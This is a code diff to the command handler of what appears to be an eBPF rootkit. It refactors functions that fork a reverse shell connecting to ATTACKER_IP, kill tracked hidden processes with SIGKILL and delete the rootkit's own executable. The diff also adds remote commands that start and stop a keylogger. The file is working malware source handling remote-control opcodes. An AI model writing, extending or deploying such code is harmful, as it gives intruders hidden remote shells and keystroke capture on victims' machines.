@@ -15,44 +15,65 @@
 /**
  * @brief Kill all tracked PIDs from eBPF map
  * except self process.
- * 
- * @param application_ctx 
+ *
+ * @param tracked_pids_map_fd
  */
-static void kill_all_tracked_pids(application_context_t *application_ctx) {
+static void kill_all_tracked_pids(int tracked_pids_map_fd) {
     pid_t pid;
     pid_t next_pid;
-    int fd = bpf_map__fd(application_ctx->skel->maps.tracked_pids_map);
 
-    int ret = bpf_map_get_next_key(fd, NULL, &next_pid);
+    int ret = bpf_map_get_next_key(tracked_pids_map_fd, NULL, &next_pid);
 
     while (ret == 0) {
         pid = next_pid;
 
         if (pid != getpid())
-            kill(pid, SIGTERM);
+            kill(pid, SIGKILL);
 
-        ret = bpf_map_get_next_key(fd, &pid, &next_pid);
+        ret = bpf_map_get_next_key(tracked_pids_map_fd, &pid, &next_pid);
     }
 }
 
 /**
  * @brief Kill revese shell process.
- * 
- * @param application_ctx 
+ *
+ * @param command_processor_ctx
  */
-static void remove_reverse_shell(application_context_t *application_ctx) {
-    if (application_ctx->reverse_shell_pid > 0) {
-        kill(application_ctx->reverse_shell_pid, SIGTERM);
-        application_ctx->reverse_shell_pid = -1;
+static void remove_reverse_shell(command_processor_context_t *command_processor_ctx) {
+    if (!command_processor_ctx)
+        return;
+
+    if (*(command_processor_ctx->reverse_shell_pid) > 0) {
+        kill(*(command_processor_ctx->reverse_shell_pid), SIGKILL);
+        *(command_processor_ctx->reverse_shell_pid) = -1;
     }
 }
 
-static void uninstall(application_context_t *application_ctx) {
+static int keylogger_start(command_processor_context_t *command_processor_ctx) {
+    if (!command_processor_ctx)
+        return -EINVAL;
+
+    *(command_processor_ctx->keylogger_active) = true;
+    return 0;
+}
+
+static int keylogger_stop(command_processor_context_t *command_processor_ctx) {
+    if (!command_processor_ctx)
+        return -EINVAL;
+
+    *(command_processor_ctx->keylogger_active) = false;
+    return 0;
+}
+
+static void uninstall(command_processor_context_t *command_processor_ctx) {
+    if (!command_processor_ctx)
+        return;
+
     /* Deleting executable */
-    unlink(application_ctx->executable_name);
-    kill_all_tracked_pids(application_ctx);
-    loader_unload_rootkit(application_ctx->skel);
-    exit(0);
+    unlink(command_processor_ctx->executable_name);
+
+    kill_all_tracked_pids(command_processor_ctx->tracked_pids_map_fd);
+    *(command_processor_ctx->rootkit_running) = false;
 }
 
 /**
@@ -61,20 +82,25 @@ static void uninstall(application_context_t *application_ctx) {
  * PID of the reverse shell will automatically be hidden
  * together with every child process of it.
  *
- * @param application_ctx
+ * @param command_processor_ctx
  * @return int
  */
-static int spawn_reverse_shell(application_context_t *application_ctx) {
+static int spawn_reverse_shell(command_processor_context_t *command_processor_ctx) {
+    if (!command_processor_ctx)
+        return -EINVAL;
+
     pid_t pid = fork();
     if (pid < 0) {
         int err = errno;
         return -err;
     }
 
-    if (pid == 0)
+    if (pid == 0) {
         reverse_shell_start(ATTACKER_IP, REVERSE_SHELL_PORT);
+        _exit(EXIT_FAILURE);
+    }
 
-    application_ctx->reverse_shell_pid = pid;
+    *(command_processor_ctx->reverse_shell_pid) = pid;
 
     return 0;
 }
@@ -83,20 +109,29 @@ int command_processor_handle_received_command(void *ctx, void *data, size_t data
     (void)ctx;
     (void)data_sz;
 
-    application_context_t *application_ctx = (application_context_t *)ctx;
+    if (!ctx || !data)
+        return -EINVAL;
+
+    command_processor_context_t *command_processor_ctx = (command_processor_context_t *)ctx;
 
     event_t *event = (event_t *)data;
 
     switch (event->command_opcode) {
     case COMMAND_REVERSE_SHELL_START:
-        if (application_ctx->reverse_shell_pid == -1)
-            spawn_reverse_shell(application_ctx);
+        if (*(command_processor_ctx->reverse_shell_pid) == -1)
+            spawn_reverse_shell(command_processor_ctx);
         break;
     case COMMAND_REVERSE_SHELL_STOP:
-        remove_reverse_shell(application_ctx);
+        remove_reverse_shell(command_processor_ctx);
         break;
-    case COMMAND_UNINSTALL:
-        uninstall(application_ctx);
+    case COMMAND_KEYLOGGER_START:
+        keylogger_start(command_processor_ctx);
+        break;
+    case COMMAND_KEYLOGGER_STOP:
+        keylogger_stop(command_processor_ctx);
+        break;
+    case COMMAND_UNINSTALL:;
+        uninstall(command_processor_ctx);
         break;
     default:
         break;
